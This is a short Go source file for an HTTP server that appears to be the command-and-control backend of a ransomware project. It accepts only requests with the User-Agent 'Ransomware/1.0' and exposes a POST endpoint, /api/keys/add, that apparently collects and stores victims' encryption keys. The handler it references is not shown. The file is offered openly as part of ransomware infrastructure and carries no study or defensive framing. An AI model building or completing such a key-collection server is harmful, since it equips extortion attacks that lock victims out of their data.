package main

import (
	"log"
	"net/http"

	"github.com/julienschmidt/httprouter"
)

const (
	ALLOWED_USER_AGENT = "Ransomware/1.0"
)

var (
	ApiResponseForbidden        = `{"status": 403, "message": "Seems like you are not welcome here... Bye"}`
	ApiResponseBadJson          = `{"status": 400, "message": "Expect valid json payload"}`
	ApiResponseDuplicatedId     = `{"status": 409, "message": "Duplicated Id"}`
	ApiResponseBadRSAEncryption = `{"status": 422, "message": "Error validating payload, bad public key"}`
	ApiResponseNoPayload        = `{"status": 422, "message": "No payload"}`
)

func main() {
	router := httprouter.New()

	router.POST("/api/keys/add", validateAndPersistKeys)

	log.Fatal(http.ListenAndServe(":8080", router))
}
